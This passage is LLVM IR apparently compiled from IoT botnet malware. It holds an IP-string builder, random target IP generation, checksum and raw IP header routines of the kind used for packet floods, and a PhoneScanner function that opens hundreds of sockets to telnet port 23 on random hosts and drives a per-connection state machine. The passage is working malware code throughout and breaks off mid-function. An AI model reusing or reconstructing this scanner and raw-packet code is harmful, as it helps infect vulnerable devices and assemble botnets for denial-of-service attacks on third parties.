  %1062 = zext i8 %1061 to i32
  %1063 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %1064 = zext i8 %1063 to i32
  %1065 = call i32 (i8*, i8*, ...) @szprintf(i8* %1060, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.289, i32 0, i32 0), i32 %1062, i32 %1064)
  br label %1066

; <label>:1066:                                   ; preds = %1059, %1056
  %1067 = load i32, i32* %1, align 4
  %1068 = icmp eq i32 %1067, 105
  br i1 %1068, label %1069, label %1076

; <label>:1069:                                   ; preds = %1066
  %1070 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %1071 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %1072 = zext i8 %1071 to i32
  %1073 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %1074 = zext i8 %1073 to i32
  %1075 = call i32 (i8*, i8*, ...) @szprintf(i8* %1070, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.290, i32 0, i32 0), i32 %1072, i32 %1074)
  br label %1076

; <label>:1076:                                   ; preds = %1069, %1066
  %1077 = load i32, i32* %1, align 4
  %1078 = icmp eq i32 %1077, 106
  br i1 %1078, label %1079, label %1086

; <label>:1079:                                   ; preds = %1076
  %1080 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %1081 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %1082 = zext i8 %1081 to i32
  %1083 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %1084 = zext i8 %1083 to i32
  %1085 = call i32 (i8*, i8*, ...) @szprintf(i8* %1080, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.291, i32 0, i32 0), i32 %1082, i32 %1084)
  br label %1086

; <label>:1086:                                   ; preds = %1079, %1076
  %1087 = load i32, i32* %1, align 4
  %1088 = icmp eq i32 %1087, 107
  br i1 %1088, label %1089, label %1096

; <label>:1089:                                   ; preds = %1086
  %1090 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %1091 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %1092 = zext i8 %1091 to i32
  %1093 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %1094 = zext i8 %1093 to i32
  %1095 = call i32 (i8*, i8*, ...) @szprintf(i8* %1090, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.292, i32 0, i32 0), i32 %1092, i32 %1094)
  br label %1096

; <label>:1096:                                   ; preds = %1089, %1086
  %1097 = load i32, i32* %1, align 4
  %1098 = icmp eq i32 %1097, 108
  br i1 %1098, label %1099, label %1106

; <label>:1099:                                   ; preds = %1096
  %1100 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %1101 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %1102 = zext i8 %1101 to i32
  %1103 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %1104 = zext i8 %1103 to i32
  %1105 = call i32 (i8*, i8*, ...) @szprintf(i8* %1100, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.293, i32 0, i32 0), i32 %1102, i32 %1104)
  br label %1106

; <label>:1106:                                   ; preds = %1099, %1096
  %1107 = load i32, i32* %1, align 4
  %1108 = icmp eq i32 %1107, 109
  br i1 %1108, label %1109, label %1116

; <label>:1109:                                   ; preds = %1106
  %1110 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %1111 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %1112 = zext i8 %1111 to i32
  %1113 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %1114 = zext i8 %1113 to i32
  %1115 = call i32 (i8*, i8*, ...) @szprintf(i8* %1110, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.294, i32 0, i32 0), i32 %1112, i32 %1114)
  br label %1116

; <label>:1116:                                   ; preds = %1109, %1106
  %1117 = load i32, i32* %1, align 4
  %1118 = icmp eq i32 %1117, 110
  br i1 %1118, label %1119, label %1126

; <label>:1119:                                   ; preds = %1116
  %1120 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %1121 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %1122 = zext i8 %1121 to i32
  %1123 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %1124 = zext i8 %1123 to i32
  %1125 = call i32 (i8*, i8*, ...) @szprintf(i8* %1120, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.295, i32 0, i32 0), i32 %1122, i32 %1124)
  br label %1126

; <label>:1126:                                   ; preds = %1119, %1116
  %1127 = load i32, i32* %1, align 4
  %1128 = icmp eq i32 %1127, 111
  br i1 %1128, label %1129, label %1136

; <label>:1129:                                   ; preds = %1126
  %1130 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %1131 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %1132 = zext i8 %1131 to i32
  %1133 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %1134 = zext i8 %1133 to i32
  %1135 = call i32 (i8*, i8*, ...) @szprintf(i8* %1130, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.296, i32 0, i32 0), i32 %1132, i32 %1134)
  br label %1136

; <label>:1136:                                   ; preds = %1129, %1126
  %1137 = load i32, i32* %1, align 4
  %1138 = icmp eq i32 %1137, 112
  br i1 %1138, label %1139, label %1146

; <label>:1139:                                   ; preds = %1136
  %1140 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %1141 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %1142 = zext i8 %1141 to i32
  %1143 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %1144 = zext i8 %1143 to i32
  %1145 = call i32 (i8*, i8*, ...) @szprintf(i8* %1140, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.297, i32 0, i32 0), i32 %1142, i32 %1144)
  br label %1146

; <label>:1146:                                   ; preds = %1139, %1136
  %1147 = load i32, i32* %1, align 4
  %1148 = icmp eq i32 %1147, 113
  br i1 %1148, label %1149, label %1156

; <label>:1149:                                   ; preds = %1146
  %1150 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %1151 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %1152 = zext i8 %1151 to i32
  %1153 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %1154 = zext i8 %1153 to i32
  %1155 = call i32 (i8*, i8*, ...) @szprintf(i8* %1150, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.298, i32 0, i32 0), i32 %1152, i32 %1154)
  br label %1156

; <label>:1156:                                   ; preds = %1149, %1146
  %1157 = load i32, i32* %1, align 4
  %1158 = icmp eq i32 %1157, 114
  br i1 %1158, label %1159, label %1166

; <label>:1159:                                   ; preds = %1156
  %1160 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %1161 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %1162 = zext i8 %1161 to i32
  %1163 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %1164 = zext i8 %1163 to i32
  %1165 = call i32 (i8*, i8*, ...) @szprintf(i8* %1160, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.299, i32 0, i32 0), i32 %1162, i32 %1164)
  br label %1166

; <label>:1166:                                   ; preds = %1159, %1156
  %1167 = load i32, i32* %1, align 4
  %1168 = icmp eq i32 %1167, 115
  br i1 %1168, label %1169, label %1176

; <label>:1169:                                   ; preds = %1166
  %1170 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %1171 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %1172 = zext i8 %1171 to i32
  %1173 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %1174 = zext i8 %1173 to i32
  %1175 = call i32 (i8*, i8*, ...) @szprintf(i8* %1170, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.300, i32 0, i32 0), i32 %1172, i32 %1174)
  br label %1176

; <label>:1176:                                   ; preds = %1169, %1166
  %1177 = load i32, i32* %1, align 4
  %1178 = icmp eq i32 %1177, 116
  br i1 %1178, label %1179, label %1186

; <label>:1179:                                   ; preds = %1176
  %1180 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %1181 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %1182 = zext i8 %1181 to i32
  %1183 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %1184 = zext i8 %1183 to i32
  %1185 = call i32 (i8*, i8*, ...) @szprintf(i8* %1180, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.301, i32 0, i32 0), i32 %1182, i32 %1184)
  br label %1186

; <label>:1186:                                   ; preds = %1179, %1176
  %1187 = load i32, i32* %1, align 4
  %1188 = icmp eq i32 %1187, 117
  br i1 %1188, label %1189, label %1196

; <label>:1189:                                   ; preds = %1186
  %1190 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %1191 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %1192 = zext i8 %1191 to i32
  %1193 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %1194 = zext i8 %1193 to i32
  %1195 = call i32 (i8*, i8*, ...) @szprintf(i8* %1190, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.302, i32 0, i32 0), i32 %1192, i32 %1194)
  br label %1196

; <label>:1196:                                   ; preds = %1189, %1186
  %1197 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %1198 = call i32 @inet_addr(i8* %1197) #5
  ret i32 %1198
}

; Function Attrs: noinline nounwind uwtable
define i32 @getRandomIP(i32) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  store i32 %0, i32* %2, align 4
  %4 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %5 = call i32 @ntohl(i32 %4) #13
  %6 = load i32, i32* %2, align 4
  %7 = and i32 %5, %6
  store i32 %7, i32* %3, align 4
  %8 = load i32, i32* %3, align 4
  %9 = call i32 @rand_cmwc()
  %10 = load i32, i32* %2, align 4
  %11 = xor i32 %10, -1
  %12 = and i32 %9, %11
  %13 = xor i32 %8, %12
  ret i32 %13
}

; Function Attrs: nounwind readnone
declare i32 @ntohl(i32) #8

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @csum(i16*, i32) #0 {
  %3 = alloca i16*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i64, align 8
  store i16* %0, i16** %3, align 8
  store i32 %1, i32* %4, align 4
  store i64 0, i64* %5, align 8
  br label %6

; <label>:6:                                      ; preds = %9, %2
  %7 = load i32, i32* %4, align 4
  %8 = icmp sgt i32 %7, 1
  br i1 %8, label %9, label %18

; <label>:9:                                      ; preds = %6
  %10 = load i16*, i16** %3, align 8
  %11 = getelementptr inbounds i16, i16* %10, i32 1
  store i16* %11, i16** %3, align 8
  %12 = load i16, i16* %10, align 2
  %13 = zext i16 %12 to i64
  %14 = load i64, i64* %5, align 8
  %15 = add i64 %14, %13
  store i64 %15, i64* %5, align 8
  %16 = load i32, i32* %4, align 4
  %17 = sub nsw i32 %16, 2
  store i32 %17, i32* %4, align 4
  br label %6

; <label>:18:                                     ; preds = %6
  %19 = load i32, i32* %4, align 4
  %20 = icmp sgt i32 %19, 0
  br i1 %20, label %21, label %28

; <label>:21:                                     ; preds = %18
  %22 = load i16*, i16** %3, align 8
  %23 = bitcast i16* %22 to i8*
  %24 = load i8, i8* %23, align 1
  %25 = zext i8 %24 to i64
  %26 = load i64, i64* %5, align 8
  %27 = add i64 %26, %25
  store i64 %27, i64* %5, align 8
  br label %28

; <label>:28:                                     ; preds = %21, %18
  br label %29

; <label>:29:                                     ; preds = %33, %28
  %30 = load i64, i64* %5, align 8
  %31 = lshr i64 %30, 16
  %32 = icmp ne i64 %31, 0
  br i1 %32, label %33, label %39

; <label>:33:                                     ; preds = %29
  %34 = load i64, i64* %5, align 8
  %35 = and i64 %34, 65535
  %36 = load i64, i64* %5, align 8
  %37 = lshr i64 %36, 16
  %38 = add i64 %35, %37
  store i64 %38, i64* %5, align 8
  br label %29

; <label>:39:                                     ; preds = %29
  %40 = load i64, i64* %5, align 8
  %41 = xor i64 %40, -1
  %42 = trunc i64 %41 to i16
  ret i16 %42
}

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @tcpcsum(%struct.iphdr*, %struct.tcphdr*) #0 {
  %3 = alloca %struct.iphdr*, align 8
  %4 = alloca %struct.tcphdr*, align 8
  %5 = alloca %struct.tcp_pseudo, align 8
  %6 = alloca i16, align 2
  %7 = alloca i32, align 4
  %8 = alloca i16*, align 8
  %9 = alloca i16, align 2
  store %struct.iphdr* %0, %struct.iphdr** %3, align 8
  store %struct.tcphdr* %1, %struct.tcphdr** %4, align 8
  %10 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %11 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %10, i32 0, i32 2
  %12 = load i16, i16* %11, align 2
  store i16 %12, i16* %6, align 2
  %13 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %14 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %13, i32 0, i32 8
  %15 = load i32, i32* %14, align 4
  %16 = zext i32 %15 to i64
  %17 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 0
  store i64 %16, i64* %17, align 8
  %18 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %19 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %18, i32 0, i32 9
  %20 = load i32, i32* %19, align 4
  %21 = zext i32 %20 to i64
  %22 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 1
  store i64 %21, i64* %22, align 8
  %23 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 2
  store i8 0, i8* %23, align 8
  %24 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 3
  store i8 6, i8* %24, align 1
  %25 = call zeroext i16 @htons(i16 zeroext 20) #13
  %26 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 4
  store i16 %25, i16* %26, align 2
  store i32 44, i32* %7, align 4
  %27 = load i32, i32* %7, align 4
  %28 = sext i32 %27 to i64
  %29 = call noalias i8* @malloc(i64 %28) #5
  %30 = bitcast i8* %29 to i16*
  store i16* %30, i16** %8, align 8
  %31 = load i16*, i16** %8, align 8
  %32 = bitcast i16* %31 to i8*
  %33 = bitcast %struct.tcp_pseudo* %5 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %32, i8* %33, i64 24, i32 1, i1 false)
  %34 = load i16*, i16** %8, align 8
  %35 = bitcast i16* %34 to i8*
  %36 = getelementptr inbounds i8, i8* %35, i64 24
  %37 = load %struct.tcphdr*, %struct.tcphdr** %4, align 8
  %38 = bitcast %struct.tcphdr* %37 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %36, i8* %38, i64 20, i32 1, i1 false)
  %39 = load i16*, i16** %8, align 8
  %40 = load i32, i32* %7, align 4
  %41 = call zeroext i16 @csum(i16* %39, i32 %40)
  store i16 %41, i16* %9, align 2
  %42 = load i16*, i16** %8, align 8
  %43 = bitcast i16* %42 to i8*
  call void @free(i8* %43) #5
  %44 = load i16, i16* %9, align 2
  ret i16 %44
}

; Function Attrs: noinline nounwind uwtable
define void @makeIPPacket(%struct.iphdr*, i32, i32, i8 zeroext, i32) #0 {
  %6 = alloca %struct.iphdr*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i8, align 1
  %10 = alloca i32, align 4
  store %struct.iphdr* %0, %struct.iphdr** %6, align 8
  store i32 %1, i32* %7, align 4
  store i32 %2, i32* %8, align 4
  store i8 %3, i8* %9, align 1
  store i32 %4, i32* %10, align 4
  %11 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %12 = bitcast %struct.iphdr* %11 to i8*
  %13 = load i8, i8* %12, align 4
  %14 = and i8 %13, -16
  %15 = or i8 %14, 5
  store i8 %15, i8* %12, align 4
  %16 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %17 = bitcast %struct.iphdr* %16 to i8*
  %18 = load i8, i8* %17, align 4
  %19 = and i8 %18, 15
  %20 = or i8 %19, 64
  store i8 %20, i8* %17, align 4
  %21 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %22 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %21, i32 0, i32 1
  store i8 0, i8* %22, align 1
  %23 = load i32, i32* %10, align 4
  %24 = sext i32 %23 to i64
  %25 = add i64 20, %24
  %26 = trunc i64 %25 to i16
  %27 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %28 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %27, i32 0, i32 2
  store i16 %26, i16* %28, align 2
  %29 = call i32 @rand_cmwc()
  %30 = trunc i32 %29 to i16
  %31 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %32 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %31, i32 0, i32 3
  store i16 %30, i16* %32, align 4
  %33 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %34 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %33, i32 0, i32 4
  store i16 0, i16* %34, align 2
  %35 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %36 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %35, i32 0, i32 5
  store i8 -1, i8* %36, align 4
  %37 = load i8, i8* %9, align 1
  %38 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %39 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %38, i32 0, i32 6
  store i8 %37, i8* %39, align 1
  %40 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %41 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %40, i32 0, i32 7
  store i16 0, i16* %41, align 2
  %42 = load i32, i32* %8, align 4
  %43 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %44 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %43, i32 0, i32 8
  store i32 %42, i32* %44, align 4
  %45 = load i32, i32* %7, align 4
  %46 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %47 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %46, i32 0, i32 9
  store i32 %45, i32* %47, align 4
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @sclose(i32) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  %4 = load i32, i32* %3, align 4
  %5 = icmp sgt i32 3, %4
  br i1 %5, label %6, label %7

; <label>:6:                                      ; preds = %1
  store i32 1, i32* %2, align 4
  br label %10

; <label>:7:                                      ; preds = %1
  %8 = load i32, i32* %3, align 4
  %9 = call i32 @close(i32 %8)
  store i32 0, i32* %2, align 4
  br label %10

; <label>:10:                                     ; preds = %7, %6
  %11 = load i32, i32* %2, align 4
  ret i32 %11
}

; Function Attrs: noinline nounwind uwtable
define void @PhoneScanner() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca [128 x i8], align 16
  %8 = alloca i8, align 1
  %9 = alloca %struct.__sigset_t, align 8
  %10 = alloca %struct.timeval, align 8
  %11 = alloca i32, align 4
  %12 = alloca [256 x i8], align 16
  %13 = alloca i8*, align 8
  %14 = alloca %struct.sockaddr_in, align 4
  %15 = alloca i8*, align 8
  %16 = alloca i8*, align 8
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  store i32 512, i32* %1, align 4
  %19 = load i32, i32* %1, align 4
  store i32 %19, i32* %6, align 4
  %20 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %21 = call i32 @rand_cmwc()
  %22 = xor i32 %20, %21
  call void @srand(i32 %22) #5
  %23 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %14, i32 0, i32 0
  store i16 2, i16* %23, align 4
  %24 = call zeroext i16 @htons(i16 zeroext 23) #13
  %25 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %14, i32 0, i32 1
  store i16 %24, i16* %25, align 2
  %26 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %14, i32 0, i32 3
  %27 = getelementptr inbounds [8 x i8], [8 x i8]* %26, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %27, i8 0, i64 8, i32 4, i1 false)
  %28 = call noalias i8* @malloc(i64 513) #5
  store i8* %28, i8** %13, align 8
  %29 = load i8*, i8** %13, align 8
  call void @llvm.memset.p0i8.i64(i8* %29, i8 0, i64 513, i32 1, i1 false)
  %30 = load i32, i32* %6, align 4
  %31 = zext i32 %30 to i64
  %32 = call i8* @llvm.stacksave()
  store i8* %32, i8** %15, align 8
  %33 = alloca %struct.telstate_t, i64 %31, align 16
  %34 = bitcast %struct.telstate_t* %33 to i8*
  %35 = load i32, i32* %6, align 4
  %36 = sext i32 %35 to i64
  %37 = mul i64 %36, 5
  call void @llvm.memset.p0i8.i64(i8* %34, i8 0, i64 %37, i32 16, i1 false)
  store i32 0, i32* %2, align 4
  br label %38

; <label>:38:                                     ; preds = %56, %0
  %39 = load i32, i32* %2, align 4
  %40 = load i32, i32* %6, align 4
  %41 = icmp slt i32 %39, %40
  br i1 %41, label %42, label %59

; <label>:42:                                     ; preds = %38
  %43 = load i32, i32* %2, align 4
  %44 = sext i32 %43 to i64
  %45 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %44
  %46 = bitcast %struct.telstate_t* %45 to i8*
  call void @llvm.memset.p0i8.i64(i8* %46, i8 0, i64 32, i32 16, i1 false)
  %47 = load i32, i32* %2, align 4
  %48 = sext i32 %47 to i64
  %49 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %48
  %50 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %49, i32 0, i32 3
  store i8 1, i8* %50, align 1
  %51 = load i8*, i8** %13, align 8
  %52 = load i32, i32* %2, align 4
  %53 = sext i32 %52 to i64
  %54 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %53
  %55 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %54, i32 0, i32 9
  store i8* %51, i8** %55, align 8
  br label %56

; <label>:56:                                     ; preds = %42
  %57 = load i32, i32* %2, align 4
  %58 = add nsw i32 %57, 1
  store i32 %58, i32* %2, align 4
  br label %38

; <label>:59:                                     ; preds = %38
  br label %60

; <label>:60:                                     ; preds = %699, %59
  br label %61

; <label>:61:                                     ; preds = %60
  store i32 0, i32* %2, align 4
  br label %62

; <label>:62:                                     ; preds = %696, %61
  %63 = load i32, i32* %2, align 4
  %64 = load i32, i32* %6, align 4
  %65 = icmp slt i32 %63, %64
  br i1 %65, label %66, label %699

; <label>:66:                                     ; preds = %62
  %67 = load i32, i32* %2, align 4
  %68 = sext i32 %67 to i64
  %69 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %68
  %70 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %69, i32 0, i32 7
  %71 = load i32, i32* %70, align 16
  %72 = icmp eq i32 %71, 0
  br i1 %72, label %73, label %79

; <label>:73:                                     ; preds = %66
  %74 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %75 = load i32, i32* %2, align 4
  %76 = sext i32 %75 to i64
  %77 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %76
  %78 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %77, i32 0, i32 7
  store i32 %74, i32* %78, align 16
  br label %79

; <label>:79:                                     ; preds = %73, %66
  %80 = load i32, i32* %2, align 4
  %81 = sext i32 %80 to i64
  %82 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %81
  %83 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %82, i32 0, i32 2
  %84 = load i8, i8* %83, align 8
  %85 = zext i8 %84 to i32
  switch i32 %85, label %695 [
    i32 0, label %86
    i32 1, label %186
    i32 2, label %329
    i32 3, label %380
    i32 4, label %402
    i32 5, label %453
    i32 6, label %475
    i32 7, label %537
    i32 8, label %559
    i32 9, label %610
    i32 10, label %632
  ]

; <label>:86:                                     ; preds = %79
  %87 = load i32, i32* %2, align 4
  %88 = sext i32 %87 to i64
  %89 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %88
  %90 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %89, i32 0, i32 3
  %91 = load i8, i8* %90, align 1
  %92 = zext i8 %91 to i32
  %93 = icmp eq i32 %92, 1
  br i1 %93, label %94, label %114

; <label>:94:                                     ; preds = %86
  %95 = load i32, i32* %2, align 4
  %96 = sext i32 %95 to i64
  %97 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %96
  %98 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %97, i32 0, i32 9
  %99 = load i8*, i8** %98, align 8
  store i8* %99, i8** %16, align 8
  %100 = load i32, i32* %2, align 4
  %101 = sext i32 %100 to i64
  %102 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %101
  %103 = bitcast %struct.telstate_t* %102 to i8*
  call void @llvm.memset.p0i8.i64(i8* %103, i8 0, i64 32, i32 16, i1 false)
  %104 = load i8*, i8** %16, align 8
  %105 = load i32, i32* %2, align 4
  %106 = sext i32 %105 to i64
  %107 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %106
  %108 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %107, i32 0, i32 9
  store i8* %104, i8** %108, align 8
  %109 = call i32 @PhoneScan()
  %110 = load i32, i32* %2, align 4
  %111 = sext i32 %110 to i64
  %112 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %111
  %113 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %112, i32 0, i32 1
  store i32 %109, i32* %113, align 4
  br label %114

; <label>:114:                                    ; preds = %94, %86
  %115 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %14, i32 0, i32 0
  store i16 2, i16* %115, align 4
  %116 = call zeroext i16 @htons(i16 zeroext 23) #13
  %117 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %14, i32 0, i32 1
  store i16 %116, i16* %117, align 2
  %118 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %14, i32 0, i32 3
  %119 = getelementptr inbounds [8 x i8], [8 x i8]* %118, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %119, i8 0, i64 8, i32 4, i1 false)
  %120 = load i32, i32* %2, align 4
  %121 = sext i32 %120 to i64
  %122 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %121
  %123 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %122, i32 0, i32 1
  %124 = load i32, i32* %123, align 4
  %125 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %14, i32 0, i32 2
  %126 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %125, i32 0, i32 0
  store i32 %124, i32* %126, align 4
  %127 = call i32 @socket(i32 2, i32 1, i32 0) #5
  %128 = load i32, i32* %2, align 4
  %129 = sext i32 %128 to i64
  %130 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %129
  %131 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %130, i32 0, i32 0
  store i32 %127, i32* %131, align 16
  %132 = load i32, i32* %2, align 4
  %133 = sext i32 %132 to i64
  %134 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %133
  %135 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %134, i32 0, i32 0
  %136 = load i32, i32* %135, align 16
  %137 = icmp eq i32 %136, -1
  br i1 %137, label %138, label %139

; <label>:138:                                    ; preds = %114
  br label %696

; <label>:139:                                    ; preds = %114
  %140 = load i32, i32* %2, align 4
  %141 = sext i32 %140 to i64
  %142 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %141
